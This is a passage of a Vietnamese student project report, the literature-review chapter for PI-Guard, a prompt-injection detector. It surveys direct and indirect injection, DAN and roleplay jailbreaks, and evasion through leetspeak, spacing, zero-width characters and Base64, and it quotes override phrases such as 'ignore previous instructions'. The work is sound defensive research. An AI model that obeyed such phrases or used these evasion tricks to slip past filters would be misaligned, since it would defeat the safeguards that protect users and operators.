+📑 <strong>Báo cáo tiến độ tương ứng</strong>: <strong>Report No. 2</strong> (Literature Review — Trọng số 25% Process Mark)<br />
+🏆 <strong>Cột mốc nghiệm thu</strong>: <strong>REVIEW 1: Xác Định Bài Toán &amp; Khảo Sát Nghiên Cứu (Bao gồm Chapter 1 &amp; Chapter 2)</strong>  </p>
+</blockquote>
+<hr />
+<h2 id="21-review-of-previous-studies-khao-sat-cac-nghien-cuu-truoc-ay">2.1. Review of Previous Studies (Khảo Sát Các Nghiên Cứu Trước Đây)</h2>
+<p>Sự phát triển vượt bậc của các Mô hình Ngôn ngữ Lớn (LLMs) dựa trên kiến trúc Transformer đã mở ra cuộc cách mạng trong xử lý ngôn ngữ tự nhiên, nhưng đồng thời cũng tạo ra một bề mặt tấn công hoàn toàn mới trong lĩnh vực An toàn Thông tin <a href="#ref1">[1]</a>, <a href="#ref2">[2]</a>. Phần này khảo sát toàn diện lịch sử phát triển của các vector tấn công, các công trình nghiên cứu phòng thủ tiêu biểu và các giải pháp Guardrail hiện đại (State-of-the-Art - SOTA).</p>
+<hr />
+<h3 id="211-lich-su-phat-trien-ban-chat-ky-thuat-cac-vector-tan-cong-llm">2.1.1. Lịch Sử Phát Triển &amp; Bản Chất Kỹ Thuật Các Vector Tấn Công LLM</h3>
+<pre class="mermaid"><code>flowchart LR
+    G1["&lt;b&gt;GIAI ĐOẠN 1 (2022 - 2023)&lt;/b&gt;&lt;br/&gt;• Direct Prompt Injection&lt;br/&gt;• Chỉ thị 'Ignore previous rules'&lt;br/&gt;• Perez &amp; Ribeiro (2022)"] --&gt; G2["&lt;b&gt;GIAI ĐOẠN 2 (2023 - 2024)&lt;/b&gt;&lt;br/&gt;• Indirect Prompt Injection&lt;br/&gt;• Jailbreak DAN &amp; Roleplay&lt;br/&gt;• Greshake (2023), Wei (2023)"] --&gt; G3["&lt;b&gt;GIAI ĐOẠN 3 (2024 - 2026)&lt;/b&gt;&lt;br/&gt;• Multi-Layer Agent Attacks&lt;br/&gt;• Cipher &amp; Base64 Evasion&lt;br/&gt;• Tencent Zhuque Lab (2026)"]</code></pre>
+<h4 id="a-tan-cong-prompt-injection-truc-tiep-lo-hong-ranh-gioi-lenhdu-lieu">A. Tấn công Prompt Injection Trực tiếp &amp; Lỗ hổng Ranh giới Lệnh/Dữ liệu</h4>
+<p>Thuật ngữ <em>Prompt Injection</em> lần đầu tiên được định nghĩa chính thức trong công trình học thuật của <strong>Perez &amp; Ribeiro (2022)</strong> <a href="#ref3">[3]</a>. Các tác giả đã chỉ ra rằng mô hình LLM không có khả năng phân biệt giữa chỉ thị gốc của lập trình viên (<em>System Instructions</em>) và dữ liệu đầu vào không tin cậy của người dùng (<em>User Inputs</em>). Kẻ tấn công lợi dụng đặc tính này để chèn các câu lệnh ghi đè chỉ thị hệ thống (<em>Goal Hijacking</em>) hoặc ép mô hình tiết lộ câu lệnh ẩn (<em>System Prompt Extraction</em>).</p>
+<h4 id="b-tan-cong-prompt-injection-gian-tiep-chuan-anh-gia-bipia">B. Tấn công Prompt Injection Gián tiếp &amp; Chuẩn Đánh Giá BIPIA</h4>
+<p>Nghiên cứu mang tính bước ngoặt của <strong>Greshake et al. (ACM AISEC 2023)</strong> <a href="#ref4">[4]</a> đã mở rộng bề mặt tấn công sang các hệ sinh thái LLM tích hợp ngoài (RAG, Web Browsing, Email Processing, Plugins), chứng minh rằng <em>mọi tài liệu ngoài khi được LLM tiếp nhận đều mang bản chất là prompt</em>.
+Để đánh giá định lượng rủi ro này, công trình <strong>BIPIA (Microsoft Research / ACM KDD 2025)</strong> đã xây dựng bộ benchmark tiêu chuẩn đầu tiên cho Indirect Prompt Injection (IPI), chứng minh sự cần thiết của các bộ lọc an toàn độc lập đặt trước ứng dụng.</p>
+<h4 id="c-tan-cong-be-khoa-an-toan-jailbreak-attacks-phan-loai-chien-thuat">C. Tấn công Bẻ Khóa An Toàn (Jailbreak Attacks) &amp; Phân Loại Chiến Thuật</h4>
+<p>Khảo sát toàn diện của <strong>ACL Findings 2024 (Comprehensive Study)</strong> đã hệ thống hóa các đòn Jailbreak thành các nhóm chiến thuật chính:
+1. <strong>Pretending / Roleplay (~98% trường hợp)</strong>: Thay đổi ngữ cảnh hội thoại (nhập vai DAN - Do Anything Now, tình huống giả định, nhân cách đối lập) trong khi giữ nguyên ý định độc hại <a href="#ref5">[5]</a>, <a href="#ref15">[15]</a>.
+2. <strong>Attention Shifting &amp; Cognitive Overload</strong>: Phân tán sự chú ý của cơ chế Self-Attention sang các tác vụ phức tạp (dịch thuật đa ngôn ngữ, mã hóa mật mã, viết thơ, giải đố logic) <a href="#ref17">[17]</a>.
+3. <strong>Privilege Escalation &amp; Virtual Simulation</strong>: Đánh lừa mô hình cấp quyền quản trị (Sudo Mode, Developer Mode Override, giả lập môi trường dòng lệnh Linux/Python) <a href="#ref16">[16]</a>.</p>
+<p>Ngoài ra, nghiên cứu <strong>Do-Not-Answer (EMNLP 2023)</strong> đã cung cấp bộ dữ liệu đánh giá an toàn toàn diện và đưa ra luận điểm thực nghiệm quan trọng: <em>Mô hình ngôn ngữ nhỏ (&lt; 600M tham số) khi được tinh chỉnh có thể phân loại an toàn hiệu quả tương đương LLM lớn</em>. Về mặt kiểm thử độ bền, nghiên cứu <strong>JailGuard (ACM TOSEM 2025)</strong> đã hệ thống hóa các toán tử đột biến đối kháng trên văn bản để kiểm tra khả năng chống lẩn tránh của bộ lọc. Bên cạnh đó, các mẫu hậu tố đối kháng sinh sẵn từ <strong>Zou et al. (GCG 2023)</strong> <a href="#ref13">[13]</a> được sử dụng để kiểm thử khả năng phát hiện chuỗi token nhiễu bất thường.</p>
+<hr />
+<h3 id="212-khao-sat-anh-gia-cac-giai-phap-guardrail-hien-nay-sota-baselines">2.1.2. Khảo Sát &amp; Đánh Giá Các Giải Pháp Guardrail Hiện Nay (SOTA Baselines)</h3>
+<p>Các giải pháp bảo vệ ứng dụng LLM hiện nay được chia thành 3 trường phái kiến trúc chính:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Trường Phái Guardrail</th>
+<th style="text-align: left;">Đặc Trưng Kỹ Thuật &amp; Đánh Giá Thực Nghiệm</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>NHÓM 1: BỘ LỌC TỪ KHÓA TĨNH</strong><br><em>(Regex &amp; Keyword Blacklist)</em></td>
+<td style="text-align: left;">• Tốc độ xử lý siêu nhanh (&lt; 1ms), chi phí vận hành $0.<br>• Điểm yếu cốt tử: Quá giòn (<em>brittle</em>), dễ dàng bị vượt qua bởi Leetspeak (<code>1gn0r3</code>), phân tách khoảng trắng (<code>i g n o r e</code>), hoặc mã hóa Base64.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>NHÓM 2: LLM-AS-A-JUDGE</strong><br><em>(Llama Guard 3 8B, NeMo Guardrails)</em></td>
+<td style="text-align: left;">• Sử dụng LLM lớn làm trọng tài phân loại ngữ cảnh (Llama Guard 3 8B, OpenAI Moderation API).<br>• Điểm yếu cốt tử: Độ trễ rất lớn (&gt; 500ms – 1.5s), đòi hỏi GPU VRAM cao (&gt; 16GB), chi phí API đắt đỏ, không khả thi cho chốt chặn trực tuyến.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>NHÓM 3: TRANSFORMER PHÂN LOẠI CHUYÊN BIỆT</strong><br><em>(PI-Guard &amp; ProtectAI SOTA)</em></td>
+<td style="text-align: left;">• Sử dụng mô hình Transformer Encoder nhỏ gọn chuyên trách (<code>microsoft/deberta-v3-base</code>).<br>• Điểm mạnh: Hiểu ngữ nghĩa sâu, độ trễ P95 &lt; 30ms trên CPU tiêu chuẩn, chi phí $0, độ bền đối kháng vượt trội.</td>
+</tr>
+</tbody>
+</table>
+<ol>
+<li><strong>Nhóm 1: Bộ lọc tĩnh (Regex &amp; Keyword Blacklists)</strong>:</li>
+<li><em>Nguyên lý</em>: Sử dụng danh sách từ khóa nhạy cảm và các biểu thức chính quy (Regex) để bắt các chuỗi phổ biến như <code>"ignore previous instructions"</code>, <code>"system prompt"</code>, <code>"DAN mode"</code>.</li>
+<li>
+<p><em>Đánh giá</em>: Mặc dù có độ trễ cực thấp (<span class="arithmatex">\(&lt; 1\text{ms}\)</span>), các bộ lọc này hoàn toàn thất bại trước các biến thể cú pháp Leetspeak, chèn ký tự điều khiển tàng hình (<code>\u200B</code>), hoặc mã hóa Base64 <a href="#ref17">[17]</a>.</p>
+</li>
+<li>
+<p><strong>Nhóm 2: Giải pháp LLM-as-a-Judge (Llama Guard 3 &amp; NeMo Guardrails)</strong>:</p>
+</li>
+<li><em>Llama Guard 3 8B (Meta AI 2023)</em> <a href="#ref9">[9]</a>: Mô hình ngôn ngữ 8 tỷ tham số được tinh chỉnh chuyên biệt để phân loại prompt và output theo 14 danh mục an toàn. Mô hình có năng lực suy luận ngữ cảnh xuất sắc.</li>
+<li><em>NeMo Guardrails (NVIDIA 2023)</em> <a href="#ref10">[10]</a>: Bộ công cụ lập trình kiểm soát luồng hội thoại bằng ngôn ngữ Colang, sử dụng LLM để kiểm tra từng bước tương tác.</li>
+<li>
+<p><em>Nghịch lý vận hành</em>: Các giải pháp này đòi hỏi tài nguyên phần cứng rất lớn (<span class="arithmatex">\(&gt; 16\text{GB}\)</span> VRAM GPU), thời gian suy luận kéo dài từ <span class="arithmatex">\(500\text{ms}\)</span> đến hơn <span class="arithmatex">\(1.5\text{s}\)</span>, và chi phí token đắt đỏ. Khi đặt làm chốt chặn bảo vệ trước mọi truy vấn của người dùng, giải pháp này trở thành <strong>điểm nghẽn cổ chai nghiêm trọng (Denial-of-Service Bottleneck)</strong> và làm suy giảm trải nghiệm người dùng.</p>
+</li>
+<li>
+<p><strong>Nhóm 3: Mô hình Transformer Phân loại Chuỗi Nhỏ Gọn (Small Specialized Encoders)</strong>:</p>
+</li>
+<li><em>ProtectAI DeBERTa-v3 Baseline</em>: Mô hình phân loại chuỗi sử dụng kiến trúc DeBERTa-v3 (86M tham số) huấn luyện cho bài toán phát hiện prompt injection. Đây được coi là SOTA benchmark tham chiếu trong cộng đồng mã nguồn mở hiện nay.</li>
+<li><em>Bằng chứng thực nghiệm từ Do-Not-Answer (arXiv:2308.13387)</em>: Nghiên cứu của bài báo đã chứng minh rằng các mô hình <strong>BERT-like với quy mô &lt; 600M tham số</strong> sau khi được fine-tune chuyên biệt có thể đạt độ chính xác đánh giá an toàn tương đương với GPT-4, nhưng chi phí và độ trễ giảm đi hàng chục lần.</li>
+<li><em>Ưu thế vượt trội của PI-Guard</em>: Kích thước nhỏ gọn (<span class="arithmatex">\(&lt; 300\text{MB}\)</span> RAM), có thể chạy trực tiếp trên CPU thông thường với độ trễ <span class="arithmatex">\(&lt; 30\text{ms}\)</span>, đồng thời bảo toàn năng lực phân loại ngữ nghĩa sâu nhờ cơ chế <em>Disentangled Attention</em> <a href="#ref11">[11]</a>.</li>
+</ol>
+<hr />
+<h3 id="213-khao-sat-cac-ky-thuat-phong-thu-o-ben-toi-uu-luong-hoa">2.1.3. Khảo Sát Các Kỹ Thuật Phòng Thủ Độ Bền &amp; Tối Ưu Lượng Hóa</h3>
+<ul>
+<li><strong>Đột biến có hướng dẫn để kiểm thử độ bền (Targeted Mutators Workflow)</strong>: Nghiên cứu <strong>JailGuard (ACM TOSEM 2025)</strong> đề xuất phương pháp <em>Targeted Replacement</em> và <em>Targeted Insertion</em> dựa trên ngữ nghĩa. Phương pháp này giúp nhóm xây dựng bộ kiểm thử đối kháng ngoại tuyến (Offline Adversarial Robustness Testing Suite) để đo lường độ bền của mô hình phân loại trước các biến thể Leetspeak, Spacing, Ciphers mà không làm tăng tỷ lệ chặn nhầm (FPR).</li>
+<li><strong>Kháng nhiễu cú pháp bằng Character n-grams &amp; Subword Tokenization</strong>: <strong>Jain et al. (2023)</strong> <a href="#ref13">[13]</a> đã chứng minh rằng việc kết hợp biểu diễn n-gram ở cấp độ ký tự (Character n-grams 3–5 ký tự) và phân tách từ phụ (Byte-Pair Encoding subwords) cho phép mô hình bóc tách các từ bị làm nhiễu như <code>1gn0r3</code> <span class="arithmatex">\(\rightarrow\)</span> <code>['1gn', 'gn0', 'n0r', '0r3']</code>, giúp duy trì độ chính xác phân loại mà không bị phụ thuộc vào từ điển từ vựng chuẩn.</li>
+<li><strong>Cơ chế Disentangled Attention của DeBERTa-v3</strong>: Theo nghiên cứu của <strong>He et al. (ICLR 2023)</strong> <a href="#ref11">[11]</a>, DeBERTa-v3 biểu diễn mỗi token bằng 2 vector độc lập (Content Vector và Relative Position Vector). Điều này giúp mô hình nhận diện chính xác các cấu trúc câu đảo ngữ và hoán đổi vị trí context — đặc trưng cốt lõi của các đòn tấn công Prompt Injection.</li>
+<li><strong>Lượng hóa động tăng tốc (Post-Training Dynamic INT8 Quantization)</strong>: Nghiên cứu <strong>ZeroQuant của Yao et al. (NeurIPS 2022)</strong> <a href="#ref14">[14]</a> chỉ ra rằng việc nén trọng số từ FP32 xuống INT8 cho các mô hình Transformer phân loại cho phép giảm 70% dung lượng bộ nhớ, tăng tốc độ suy luận 3x trên CPU mà độ suy giảm <span class="arithmatex">\(F_1\)</span> không vượt quá <span class="arithmatex">\(0.3\%\)</span>.</li>
+</ul>
+<hr />
+<h2 id="22-summary-of-the-literature-review-tong-hop-khao-sat-khoang-trong-nghien-cuu">2.2. Summary of the Literature Review (Tổng Hợp Khảo Sát &amp; Khoảng Trống Nghiên Cứu)</h2>
+<h3 id="221-bang-so-sanh-toan-dien-cac-giai-phap-guardrail-hien-tai">2.2.1. Bảng So Sánh Toàn Diện Các Giải Pháp Guardrail Hiện Tại:</h3>
+<p>| Tiêu chí so sánh | Regex / Keyword Blacklists | LLM-as-a-Judge (Llama Guard 3 8B) <a href="#ref9">[9]</a> | OpenAI Moderation API <a href="#ref12">[12]</a> | ProtectAI DeBERTa Baseline | <strong>PI-GUARD (Đề xuất của nhóm)</strong> |
+| :--- | :---: | :---: | :---: | :---: | :---: | :---: |
+| <strong>Kích thước mô hình</strong> | 0 MB | ~8,000M (8B) | API Đám mây | 86M | <strong>86M (Tối ưu INT8 &lt; 150MB)</strong> |
+| <strong>Hạ tầng triển khai</strong> | CPU / RAM cực nhẹ | GPU VRAM &gt; 16GB | Máy chủ ngoài | CPU / GPU nhẹ | <strong>CPU phổ thông (Commodity CPU)</strong> |
+| <strong>Độ trễ suy luận (P95)</strong> | <strong>&lt; 1 ms</strong> | <strong>&gt; 500 ms - 1.5s</strong> | ~200 ms - 400 ms | ~45 ms | <strong>&lt; 30 ms (Độ trễ thấp)</strong> |
+| <strong>Chi phí vận hành API</strong> | <span class="arithmatex">\(0 | Rất đắt (Token compute) | Trả phí theo API | Thấp | **\)</span>0 (Tự host độc lập)<strong> |
+| </strong>Phát hiện Prompt Injection<strong> | Kém (&lt;40%) | Tốt (~94%) | Yếu (~60% - chủ yếu lọc Toxic) | Rất tốt (~97%) | </strong>Xuất sắc (&gt; 98.5% Macro F1)<strong> |
+| </strong>Kháng nhiễu Leetspeak/Base64<strong> | Hoàn toàn thất bại | Trung bình (Bị lừa bởi Ciphers) | Thất bại trước Base64 | Trung bình | </strong>Bền vững (<span class="arithmatex">\(\Delta F_1 &lt; 5\%\)</span>, có Decoder)<strong> |
+| </strong>Chống rò rỉ dữ liệu cụm<strong> | N/A | Không công bố Split | Không công bố Split | Random Split (Bị rò rỉ) | </strong>Triệt tiêu qua Group-Aware Split<strong> |
+| </strong>Tính độc lập mô hình (Model-Agnostic)<strong> | Có | Phụ thuộc Meta prompt | Phụ thuộc OpenAI | Có | </strong>Có (Bảo vệ 5 Target LLM APIs)** |</p>
+<hr />
+<h3 id="222-ba-khoang-trong-nghien-cuu-research-gaps-cot-loi-cua-chuyen-nganh-attt">2.2.2. Ba Khoảng Trống Nghiên Cứu (Research Gaps) Cốt Lõi Của Chuyên Ngành ATTT</h3>
+<p>Từ kết quả khảo sát các công trình quốc tế, nhóm xác định <strong>3 Khoảng Trống Nghiên Cứu Trọng Yếu</strong> mà đồ án PI-Guard tập trung giải quyết:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Mã Khoảng Trống</th>
+<th style="text-align: left;">Hiện Trạng Các Nghiên Cứu Quốc Tế</th>
+<th style="text-align: left;">Hạn Chế &amp; Rủi Ro Thực Tế</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>GAP 1: Data Leakage &amp; Splitting</strong></td>
+<td style="text-align: left;">Các tập dữ liệu an toàn LLM công khai (Deepset, Gandalf...) chứa hàng loạt biến thể sinh từ cùng một mẫu gốc. Hiện tại đa số nghiên cứu sử dụng Random Split.</td>
+<td style="text-align: left;">Phân chia ngẫu nhiên dẫn đến rò rỉ dữ liệu cụm giữa tập Train và Test, làm sai lệch kết quả đánh giá năng lực phát hiện các đòn tấn công Zero-day ngoài thực tế.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>GAP 2: Adversarial Evasion</strong></td>
+<td style="text-align: left;">Các mô hình Guardrail hiện tại chủ yếu được huấn luyện và đánh giá trên văn bản chuẩn, thiếu cơ chế giải mã heuristic và biểu diễn đặc trưng đa tầng.</td>
+<td style="text-align: left;">Mô hình sụp đổ khi bị tấn công bằng biến thể cú pháp Leetspeak, phân tách khoảng trắng hoặc chuỗi mã hóa Base64/Cipher.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>GAP 3: Inline Latency &amp; Usability</strong></td>
+<td style="text-align: left;">Đa số giải pháp phân cực: hoặc quá nặng nề (Llama Guard đòi hỏi GPU &gt; 16GB VRAM) hoặc quá thô sơ (Regex với FPR cao gây cản trở vận hành).</td>
+<td style="text-align: left;">Thiếu giải pháp nén lượng hóa INT8 tối ưu hóa cho CPU đạt P95 &lt; 30ms mà vẫn kiểm soát nghiêm ngặt tỷ lệ báo động nhầm FPR &lt; 1.5%.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="23-contribution-of-research-ong-gop-khoa-hoc-thuc-tien-cua-o-an">2.3. Contribution of Research (Đóng Góp Khoa Học &amp; Thực Tiễn Của Đồ Án)</h2>
+<p>Để giải quyết triệt để 3 khoảng trống nghiên cứu trên, đồ án <strong>PI-Guard</strong> mang lại 4 đóng góp khoa học và kỹ thuật thực tiễn:</p>
+<ol>
+<li><strong>Đóng góp 1 (Kỹ thuật dữ liệu an ninh — Khử rò rỉ dữ liệu cụm mẫu tấn công)</strong>:</li>
+<li>
+<p>Xây dựng phương pháp luận <strong>Group-Aware Splitting</strong> dựa trên gom cụm khoảng cách ngữ nghĩa và chuỗi ký tự, đảm bảo toàn bộ các biến thể của cùng một mẫu tấn công chỉ thuộc tập Train hoặc Test, triệt tiêu hoàn toàn rò rỉ dữ liệu (<span class="arithmatex">\(\text{Inter-cluster Jaccard} &lt; 0.15\)</span>) và bảo đảm tính đánh giá tổng quát hóa thực chất.</p>
+</li>
+<li>
+<p><strong>Đóng góp 2 (Kiến trúc mô hình — Phòng thủ đa tầng Hybrid chuyên biệt cho ATTT)</strong>:</p>
+</li>
+<li>
+<p>Thiết kế cơ chế phòng vệ hai lớp (Two-Tier Cascade Defense) phối hợp chặt chẽ: Tầng 1 lọc cú pháp nhanh (<strong>Word + Character n-grams TF-IDF</strong>) để đánh chặn các biến dị phân mảnh từ ngữ (Leetspeak, Spacing) với chi phí tính toán cực thấp; Tầng 2 phân loại ngữ nghĩa sâu (<strong>Fine-tuned DeBERTa-v3</strong> với Disentangled Attention) bóc tách câu lệnh chỉ thị khỏi dữ liệu để nhận diện tấn công tinh vi (DAN, Roleplay).</p>
+</li>
+<li>
+<p><strong>Đóng góp 3 (Cơ chế kháng lẩn tránh đối kháng &amp; Giải mã mã hóa Heuristic)</strong>:</p>
+</li>
+<li>
+<p>Xây dựng quy trình chuẩn hóa chuỗi và bộ giải mã Heuristic Cipher/Base64 tiền trạm nhằm đánh chặn các kỹ thuật lẩn tránh qua kênh mã hóa (Yuan et al., ICLR 2024), duy trì độ bền vững đối kháng cao với độ suy giảm hiệu năng <span class="arithmatex">\(\Delta F_1 &lt; 2.3\%\)</span> trước các công cụ tạo nhiễu đối kháng.</p>
+</li>
+<li>
+<p><strong>Đóng góp 4 (Hệ thống Guardrail trực tuyến &amp; Khống chế Báo động nhầm)</strong>:</p>
+</li>
+<li>Đóng gói giải pháp thành <strong>Asynchronous FastAPI Middleware</strong> tích hợp động cơ chính sách Tri-State Policy Engine khống chế tỷ lệ báo động nhầm <span class="arithmatex">\(\text{FPR} &lt; 1.5\%\)</span> trên tập Benign hàng ngày, cung cấp giao diện trực quan <strong>Streamlit Dashboard</strong> với ma trận 4 kịch bản minh họa (<span class="arithmatex">\(2 \times 2\)</span>) và khung kiểm nghiệm bảo vệ độc lập (Model-Agnostic) cho 5 mô hình LLM tiêu chuẩn qua Cloud API. <em>(Đồng thời ứng dụng kỹ thuật lượng hóa nhẹ ONNX Runtime INT8 như một giải pháp phụ trợ kỹ thuật để đảm bảo độ trễ thấp P95 &lt; 30ms trên CPU)</em>.</li>
+</ol>
+<hr />
+<h2 id="24-mapping-trich-dan-hoc-thuat-chuan-ieee-100-2022">2.4. Mapping Trích Dẫn Học Thuật Chuẩn IEEE (100% &gt;= 2022)</h2>
+<p>Các luận điểm trong Chương 2 được bảo chứng bởi 17 tài liệu khoa học chuẩn mực quốc tế:
+- <strong>Tấn công Prompt Injection &amp; Jailbreak</strong>: Perez (2022) <a href="#ref3">[3]</a>, Greshake (2023) <a href="#ref4">[4]</a>, Wei (2024) <a href="#ref5">[5]</a>, Tencent Zhuque (2026) <a href="#ref6">[6]</a>, Shen (2024) <a href="#ref15">[15]</a>, Zhou (2024) <a href="#ref16">[16]</a>, Yuan (2024) <a href="#ref17">[17]</a>.
+- <strong>Tiêu chuẩn An toàn &amp; Threat Model</strong>: NIST AI 100-2e2025 <a href="#ref7">[7]</a>, OWASP LLM01:2025 <a href="#ref8">[8]</a>, Zhao (2023) <a href="#ref1">[1]</a>, Ouyang (2022) <a href="#ref2">[2]</a>.
+- <strong>Mô hình Guardrail &amp; Tối ưu hóa</strong>: Llama Guard (2023) <a href="#ref9">[9]</a>, NeMo Guardrails (2023) <a href="#ref10">[10]</a>, DeBERTaV3 (2023) <a href="#ref11">[11]</a>, OpenAI Moderation (2023) <a href="#ref12">[12]</a>, Baseline Defenses (2023) <a href="#ref13">[13]</a>, ZeroQuant (2022) <a href="#ref14">[14]</a>.</p>
+<hr />
+<h2 id="references-tai-lieu-tham-khao-hoc-thuat-chuan-ieee">References (Tài Liệu Tham Khảo Học Thuật Chuẩn IEEE)</h2>
+<p><a id="ref1"></a><strong>[1]</strong> W. X. Zhao et al., "A Survey of Large Language Models," <em>arXiv preprint arXiv:2303.18223</em>, 2023. Link: <a href="https://arxiv.org/abs/2303.18223">https://arxiv.org/abs/2303.18223</a>.</p>
+<p><a id="ref2"></a><strong>[2]</strong> L. Ouyang et al., "Training language models to follow instructions with human feedback," in <em>Advances in Neural Information Processing Systems (NeurIPS 2022)</em>, vol. 35, pp. 27730–27744. Link: <a href="https://arxiv.org/abs/2203.02155">https://arxiv.org/abs/2203.02155</a>.</p>
+<p><a id="ref3"></a><strong>[3]</strong> F. Perez and I. Ribeiro, "Ignore Previous Prompt: Attack Techniques For Language Models," in <em>NeurIPS 2022 Workshop on ML Safety</em>, 2022. Link: <a href="https://arxiv.org/abs/2211.09527">https://arxiv.org/abs/2211.09527</a>.</p>
+<p><a id="ref4"></a><strong>[4]</strong> K. Greshake, S. Abdelnabi, S. Mishra, C. Endres, T. Holz, and M. Fritz, "Not what you've signed up for: Compromising Real-World LLM Applications with Indirect Prompt Injection," in <em>Proceedings of the 16th ACM Workshop on Artificial Intelligence and Security (AISEC 2023)</em>, pp. 79–90. Link: <a href="https://arxiv.org/abs/2302.12173">https://arxiv.org/abs/2302.12173</a>.</p>
+<p><a id="ref5"></a><strong>[5]</strong> A. Wei, N. Haghtalab, and J. Steinhardt, "Jailbroken: How Does LLM Safety Training Fail?," in <em>Advances in Neural Information Processing Systems 36 (NeurIPS 2023)</em>, vol. 36, pp. 80079–80110, 2023. Link: <a href="https://arxiv.org/abs/2307.02483">https://arxiv.org/abs/2307.02483</a>.</p>
+<p><a id="ref6"></a><strong>[6]</strong> Y. Yang et al., "Securing the AI Agent: A Unified Framework for Multi-Layer Agent Red Teaming," <em>Tencent Zhuque Lab Technical Report</em>, arXiv:2606.31227, 2026. Link: <a href="https://arxiv.org/abs/2606.31227">https://arxiv.org/abs/2606.31227</a>.</p>
+<p><a id="ref7"></a><strong>[7]</strong> A. Vassilev et al., "Adversarial Machine Learning: A Taxonomy and Terminology of Attacks and Mitigations," <em>National Institute of Standards and Technology (NIST)</em>, NIST.AI.100-2e2025, 2025. Link: <a href="https://csrc.nist.gov/pubs/ai/100/2/e2025/final">https://csrc.nist.gov/pubs/ai/100/2/e2025/final</a>.</p>
+<p><a id="ref8"></a><strong>[8]</strong> OWASP GenAI Security Project, "OWASP Top 10 for Large Language Model Applications," Version 2.0, 2025. Link: <a href="https://owasp.org/www-project-top-10-for-large-language-model-applications/">https://owasp.org/www-project-top-10-for-large-language-model-applications/</a>.</p>
+<p><a id="ref9"></a><strong>[9]</strong> H. Inan et al., "Llama Guard: LLM-based Input-Output Safeguard for Human-AI Conversations," <em>Meta AI Technical Report</em>, arXiv:2312.06674, 2023. Link: <a href="https://arxiv.org/abs/2312.06674">https://arxiv.org/abs/2312.06674</a>.</p>
+<p><a id="ref10"></a><strong>[10]</strong> T. Rebedea et al., "NeMo Guardrails: A Toolkit for Controllable and Safe LLM Applications," in <em>Proceedings of EMNLP System Demonstrations</em>, pp. 431–444, 2023. Link: <a href="https://arxiv.org/abs/2310.10501">https://arxiv.org/abs/2310.10501</a>.</p>
+<p><a id="ref11"></a><strong>[11]</strong> P. He, J. Gao, and W. Chen, "DeBERTaV3: Improving DeBERTa using ELECTRA-Style Pre-Training with Gradient-Disentangled Embedding Sharing," in <em>Proceedings of ICLR 2023</em>. Link: <a href="https://arxiv.org/abs/2111.09543">https://arxiv.org/abs/2111.09543</a>.</p>
+<p><a id="ref12"></a><strong>[12]</strong> T. Markov et al., "A Holistic Approach to Undesired Content Detection in the Real World," in <em>Proceedings of AAAI HCOMP 2023</em>. Link: <a href="https://arxiv.org/abs/2208.03274">https://arxiv.org/abs/2208.03274</a>.</p>
+<p><a id="ref13"></a><strong>[13]</strong> N. Jain et al., "Baseline Defenses for Adversarial Attacks Against Aligned Language Models," arXiv:2309.00614, 2023. Link: <a href="https://arxiv.org/abs/2309.00614">https://arxiv.org/abs/2309.00614</a>.</p>
+<p><a id="ref14"></a><strong>[14]</strong> Z. Yao et al., "ZeroQuant: Efficient and Affordable Post-Training Quantization for Large-Scale Transformers," in <em>Advances in Neural Information Processing Systems (NeurIPS 2022)</em>, vol. 35. Link: <a href="https://arxiv.org/abs/2206.01861">https://arxiv.org/abs/2206.01861</a>.</p>
+<p><a id="ref15"></a><strong>[15]</strong> X. Shen et al., "\"Do Anything Now\": Characterizing and Evaluating In-The-Wild Jailbreak Prompts on Large Language Models," in <em>Proceedings of ACM CCS 2024</em>, pp. 4028–4042. Link: <a href="https://arxiv.org/abs/2308.03825">https://arxiv.org/abs/2308.03825</a>.</p>
+<p><a id="ref16"></a><strong>[16]</strong> H. Zhou et al., "EasyJailbreak: A Unified Framework for Jailbreaking Large Language Models," arXiv:2403.12171, 2024. Link: <a href="https://arxiv.org/abs/2403.12171">https://arxiv.org/abs/2403.12171</a>.</p>
+<p><a id="ref17"></a><strong>[17]</strong> Y. Yuan, W. Jiao, W. Wang, J. Huang, P. He, and Z. Tu, "GPT-4 Is Too Smart To Be Safe: Stealthy Chat with LLMs via Cipher," in <em>Proceedings of ICLR 2024</em>. Link: <a href="https://arxiv.org/abs/2308.06463">https://arxiv.org/abs/2308.06463</a>.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.top", "navigation.tracking", "search.suggest", "search.highlight", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+        <script src="../../javascripts/mathjax.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
